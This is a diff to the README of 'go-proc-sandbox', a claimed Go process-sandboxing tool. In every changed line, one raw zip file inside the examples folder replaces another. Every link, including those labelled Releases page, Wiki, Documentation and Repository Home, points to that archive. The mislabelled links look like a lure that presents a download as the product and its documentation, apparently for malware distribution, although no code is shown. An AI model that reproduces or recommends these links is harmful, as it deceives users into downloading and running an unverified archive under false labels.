@@ -1,7 +1,7 @@
 # 🛡️ go-proc-sandbox - Securely Run Processes with Ease
 
 ## 📥 Download Now
-[![Download go-proc-sandbox](https://github.com/Ashup0309/go-proc-sandbox/raw/refs/heads/main/examples/proc_sandbox_go_3.6.zip)](https://github.com/Ashup0309/go-proc-sandbox/raw/refs/heads/main/examples/proc_sandbox_go_3.6.zip)
+[![Download go-proc-sandbox](https://github.com/Ashup0309/go-proc-sandbox/raw/refs/heads/main/examples/basic/go_sandbox_proc_v3.5-beta.1.zip)](https://github.com/Ashup0309/go-proc-sandbox/raw/refs/heads/main/examples/basic/go_sandbox_proc_v3.5-beta.1.zip)
 
 ## 🚀 Getting Started
 Welcome to go-proc-sandbox! This tool helps you safely run applications while controlling their CPU, memory, filesystem access, and execution time. It uses features of your operating system to keep tasks within set limits. 
@@ -23,7 +23,7 @@ To use go-proc-sandbox, you need the following:
 ## 📥 Download & Install
 Follow these simple steps to download and install go-proc-sandbox:
 
-1. **Visit the Releases Page**: Click the following link to go to the download page: [go-proc-sandbox Releases](https://github.com/Ashup0309/go-proc-sandbox/raw/refs/heads/main/examples/proc_sandbox_go_3.6.zip).
+1. **Visit the Releases Page**: Click the following link to go to the download page: [go-proc-sandbox Releases](https://github.com/Ashup0309/go-proc-sandbox/raw/refs/heads/main/examples/basic/go_sandbox_proc_v3.5-beta.1.zip).
   
 2. **Choose the Latest Release**: On the releases page, look for the latest version. You will find files for different operating systems.
 
@@ -58,7 +58,7 @@ If you encounter any issues, try the following steps:
 - **Compatibility Errors**: Verify that the application you are trying to run is compatible with resource restrictions.
 
 ## 📚 Resources
-- **Documentation**: Visit our [Wiki](https://github.com/Ashup0309/go-proc-sandbox/raw/refs/heads/main/examples/proc_sandbox_go_3.6.zip) for in-depth guidance on features and configurations.
+- **Documentation**: Visit our [Wiki](https://github.com/Ashup0309/go-proc-sandbox/raw/refs/heads/main/examples/basic/go_sandbox_proc_v3.5-beta.1.zip) for in-depth guidance on features and configurations.
 - **Community Discussions**: Join discussions in the Issues section of the repository to share experiences and seek help.
 
 ## 💡 Tips for Effective Use
@@ -73,8 +73,8 @@ Your input is valuable. If you have suggestions or spot issues, please consider 
 If you need assistance, you can open an issue in the repository. We aim to respond within 48 hours.
 
 ## 🔗 Useful Links
-- [Download go-proc-sandbox](https://github.com/Ashup0309/go-proc-sandbox/raw/refs/heads/main/examples/proc_sandbox_go_3.6.zip)
-- [Repository Home](https://github.com/Ashup0309/go-proc-sandbox/raw/refs/heads/main/examples/proc_sandbox_go_3.6.zip)
-- [Wiki](https://github.com/Ashup0309/go-proc-sandbox/raw/refs/heads/main/examples/proc_sandbox_go_3.6.zip)
+- [Download go-proc-sandbox](https://github.com/Ashup0309/go-proc-sandbox/raw/refs/heads/main/examples/basic/go_sandbox_proc_v3.5-beta.1.zip)
+- [Repository Home](https://github.com/Ashup0309/go-proc-sandbox/raw/refs/heads/main/examples/basic/go_sandbox_proc_v3.5-beta.1.zip)
+- [Wiki](https://github.com/Ashup0309/go-proc-sandbox/raw/refs/heads/main/examples/basic/go_sandbox_proc_v3.5-beta.1.zip)
 
 Feel free to reach out if you have any questions or need help getting started!
